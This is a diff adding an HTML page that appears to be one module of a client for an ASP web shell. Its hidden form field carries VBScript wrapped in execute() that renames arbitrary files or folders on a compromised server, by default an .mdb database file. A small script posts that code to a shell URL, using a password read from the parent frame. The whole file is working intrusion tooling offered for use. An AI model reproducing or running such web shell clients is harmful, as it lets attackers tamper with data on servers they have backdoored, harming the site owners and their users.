@@ -1,0 +1,22 @@
+<link rel="stylesheet" type="text/css" href="lake2.css">
+<div align="center">Rename<br> 
+FolderPath like as <b>e:\myweb\</b> , FolderName can't inlcude &quot;\&quot; </div>
+<form method="post" name="xform" target="_blank">
+  <p>
+  From: 
+    <input name="pathf" type="text" id="pathf" value="f:\lake2.mdb" size="40">
+    ( path ) <br>
+    to:&nbsp;&nbsp;
+    <input name="patht" type="text" id="patht" value="fuck.mdb" size="40">
+    ( name ) <br>
+  <br>
+  <input type="hidden" name="code" value='execute("response.clear:Pathfr=request(""pathf""):Pathto=request(""patht""):Set fso=CreateObject(""Scripting.FileSystemObject""):If Right(Pathfr,1)=""\"" Then:Set theFolder=fso.GetFolder(Pathfr):theFolder.Name=pathto:Set theFolder=Nothing:Else:Set theFile=fso.GetFile(Pathfr):theFile.Name=pathto:Set theFile=Nothing:End If:Response.write(""Rename <b>""&Pathfr&""</b> to <b>""&Pathto&""</b> Success!""):response.end")'> 
+  </p>
+</form>
+<script>
+function RUNonclick(){
+document.xform.code.name = parent.pwd.value;
+document.xform.action = parent.url.value;
+document.xform.submit();
+}
+</script>
